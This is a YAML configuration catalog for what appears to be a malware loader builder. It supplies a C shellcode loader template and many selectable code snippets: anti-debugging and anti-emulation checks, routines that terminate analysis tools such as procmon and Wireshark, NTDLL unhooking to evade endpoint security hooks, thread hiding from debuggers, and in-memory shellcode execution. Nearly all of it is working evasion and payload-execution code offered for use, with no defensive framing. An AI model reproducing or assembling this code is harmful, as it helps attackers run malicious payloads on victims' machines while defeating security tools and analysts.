# ============================================================================
# WASHMACHINE AGGRESSIVE CATALOG
# ============================================================================
# Heavy anti-analysis and anti-debugging features
# Designed for actively hostile environments
# ============================================================================

templates:
  - id: "aggressive"
    display: "Aggressive Loader"
    description: "Heavy anti-analysis and active debugger countermeasures."
    content: |
      #define WIN32_LEAN_AND_MEAN
      #include <windows.h>
      #include <winternl.h>
      #include <intrin.h>
      #include <tlhelp32.h>

      {{PROCESS_LOOKUP_HELPER}}

      // Self-protection thread
      DWORD WINAPI AntiAnalysisThread(LPVOID lpParam) {
          while (TRUE) {
              // Continuous debugger check
              if (IsDebuggerPresent()) ExitProcess(0);
              
              // Check for debugging tools
              const wchar_t* tools[] = {L"x64dbg.exe", L"ida.exe", L"procmon.exe", L"wireshark.exe"};
              HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
              if (snap != INVALID_HANDLE_VALUE) {
                  PROCESSENTRY32W pe = {sizeof(pe)};
                  if (Process32FirstW(snap, &pe)) {
                      do {
                          for (int i = 0; i < 4; i++) {
                              if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {
                                  CloseHandle(snap);
                                  ExitProcess(0);
                              }
                          }
                      } while (Process32NextW(snap, &pe));
                  }
                  CloseHandle(snap);
              }
              Sleep(1000);
          }
          return 0;
      }

      INT main(VOID)
      {
          // Start continuous monitoring
          CreateThread(NULL, 0, AntiAnalysisThread, NULL, 0, NULL);

          {{ANTI_EMULATION}}

          {{ANTI_ANALYSIS}}

          {{ANTI_DEBUGGING}}

          {{SHELLCODE_SOURCE}}
          {{SHELLCODE_URL}}

          {{SHELLCODE_EXECUTION}}

          return 0;
      }
    placeholders:
      - name: "PROCESS_LOOKUP_HELPER"
        kind: system
      - name: "ANTI_EMULATION"
        kind: snippet
        snippetTemplate: "antiemulation"
      - name: "ANTI_ANALYSIS"
        kind: snippet
        snippetTemplate: "antianalysis"
      - name: "ANTI_DEBUGGING"
        kind: snippet
        snippetTemplate: "antidebugging"
      - name: "SHELLCODE_SOURCE"
        kind: system
      - name: "SHELLCODE_URL"
        kind: system
      - name: "SHELLCODE_EXECUTION"
        kind: snippet
        snippetTemplate: "shellcodeexecution"

sections:
  # --------------------------------------------------------------------------
  # ANTI-EMULATION
  # --------------------------------------------------------------------------
  - header: "Anti Emulation"
    template: "antiemulation"
    display: "Anti-Emulation"
    allowMultiple: true
    items:
      - id: "ExtremeSirAlloc"
        display: "Extreme Memory Exhaustion"
        default: true
        snippet: |
          // Extreme memory allocation to crash emulators
          {
              const int COUNT = 200;
              const int ITERS = 10;
              void* allocs[200];
              DWORD prot;
              
              for(int iter = 0; iter < ITERS; iter++) {
                  for(int n = 0; n < COUNT; n++) {
                      allocs[n] = VirtualAlloc(NULL, 16384, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                      if (allocs[n]) {
                          volatile BYTE *p = (BYTE*)allocs[n];
                          for(int j = 0; j < 16384; j += 128) {
                              p[j] = (BYTE)(j ^ iter ^ n);
                          }
                      }
                  }
                  for(int n = 0; n < COUNT; n++) {
                      if (allocs[n]) VirtualProtect(allocs[n], 16384, PAGE_EXECUTE_READ, &prot);
                  }
                  for(int n = 0; n < COUNT; n++) {
                      if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);
                  }
              }
          }

      - id: "LongDelay"
        display: "Extended Time Delay"
        default: false
        snippet: |
          // 10 second delay to defeat time-limited emulators
          {
              DWORD start = *(DWORD*)0x7ffe0320;
              while (*(DWORD*)0x7ffe0320 - start < 10000) {
                  volatile int x = 0;
                  for (int i = 0; i < 1000; i++) x += i;
              }
          }

  # --------------------------------------------------------------------------
  # ANTI-ANALYSIS - Active Countermeasures
  # --------------------------------------------------------------------------
  - header: "Anti Analysis"
    template: "antianalysis"
    display: "Anti-Analysis"
    allowMultiple: true
    items:
      - id: "KillAnalysisTools"
        display: "Terminate Analysis Processes"
        default: true
        snippet: |
          // Actively terminate analysis tools
          {
              const wchar_t* targets[] = {
                  L"procmon.exe", L"procexp.exe", L"procexp64.exe",
                  L"Wireshark.exe", L"fiddler.exe", L"tcpview.exe",
                  L"autoruns.exe", L"filemon.exe", L"regmon.exe",
                  L"ProcessHacker.exe", L"perfmon.exe"
              };
              
              HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
              if (snap != INVALID_HANDLE_VALUE) {
                  PROCESSENTRY32W pe = {sizeof(pe)};
                  if (Process32FirstW(snap, &pe)) {
                      do {
                          for (int i = 0; i < 11; i++) {
                              if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                                  HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                                  if (hp) {
                                      TerminateProcess(hp, 0);
                                      CloseHandle(hp);
                                  }
                              }
                          }
                      } while (Process32NextW(snap, &pe));
                  }
                  CloseHandle(snap);
              }
          }

      - id: "UnhookNtdll"
        display: "NTDLL Unhooking"
        default: false
        snippet: |
          // Unhook NTDLL by mapping fresh copy from disk
          {
              HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", 
                                         GENERIC_READ, FILE_SHARE_READ, NULL, 
                                         OPEN_EXISTING, 0, NULL);
              if (hFile != INVALID_HANDLE_VALUE) {
                  HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
                  if (hMap) {
                      PVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
                      if (pClean) {
                          HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
                          PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
                          PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
                          
                          PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
                          for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
                              if (memcmp(pSec[i].Name, ".text", 5) == 0) {
                                  DWORD oldProt;
                                  PVOID pDest = (PVOID)((PBYTE)hNtdll + pSec[i].VirtualAddress);
                                  PVOID pSrc = (PVOID)((PBYTE)pClean + pSec[i].VirtualAddress);
                                  VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
                                  memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);
                                  VirtualProtect(pDest, pSec[i].Misc.VirtualSize, oldProt, &oldProt);
                                  break;
                              }
                          }
                          UnmapViewOfFile(pClean);
                      }
                      CloseHandle(hMap);
                  }
                  CloseHandle(hFile);
              }
          }

      - id: "HideFromDebugger"
        display: "Hide Thread From Debugger"
        default: false
        snippet: |
          // Use NtSetInformationThread to hide from debugger
          {
              typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
              pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
              if (NtSIT) {
                  // ThreadHideFromDebugger = 0x11
                  NtSIT(GetCurrentThread(), 0x11, NULL, 0);
              }
          }

  # --------------------------------------------------------------------------
  # ANTI-DEBUGGING - Aggressive Detection
  # --------------------------------------------------------------------------
  - header: "Anti Debugging"
    template: "antidebugging"
    display: "Anti-Debugging"
    allowMultiple: true
    items:
      - id: "AllChecks"
        display: "All Anti-Debug Checks"
        default: true
        snippet: |
          // Comprehensive anti-debugging
          {
              // API checks
              if (IsDebuggerPresent()) ExitProcess(0);
              BOOL dbg = FALSE;
              CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
              if (dbg) ExitProcess(0);

              // PEB checks
              #ifdef _WIN64
              PPEB peb = (PPEB)__readgsqword(0x60);
              PDWORD ntg = (PDWORD)((PBYTE)peb + 0xBC);
              #else
              PPEB peb = (PPEB)__readfsdword(0x30);
              PDWORD ntg = (PDWORD)((PBYTE)peb + 0x68);
              #endif
              if (peb->BeingDebugged) ExitProcess(0);
              if (*ntg & 0x70) ExitProcess(0);

              // Hardware breakpoints
              CONTEXT ctx = {0};
              ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
              GetThreadContext(GetCurrentThread(), &ctx);
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);

              // Timing check
              unsigned __int64 t = __rdtsc();
              volatile int x = 0; for (int i = 0; i < 100; i++) x++;
              if (__rdtsc() - t > 0x100000) ExitProcess(0);

              // Debug port
              typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
              pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
              if (NtQIP) {
                  HANDLE port = NULL;
                  if (NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL) == 0 && port) ExitProcess(0);
              }
          }

  # --------------------------------------------------------------------------
  # SHELLCODE EXECUTION
  # --------------------------------------------------------------------------
  - header: "Shellcode Execution"
    template: "shellcodeexecution"
    display: "Shellcode Execution"
    allowMultiple: false
    items:
      - id: "SecureExec"
        display: "Secure Execution with Cleanup"
        default: true
        snippet: |
          // Execute with memory cleanup
          {
              void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
              if (!mem) return -1;
              memcpy(mem, code_blob, code_blob_len);
              
              // Clear original buffer
              SecureZeroMemory(code_blob, code_blob_len);
              
              DWORD old;
              VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
              ((void(*)())mem)();
              
              // Cleanup
              VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
              SecureZeroMemory(mem, code_blob_len);
              VirtualFree(mem, 0, MEM_RELEASE);
          }

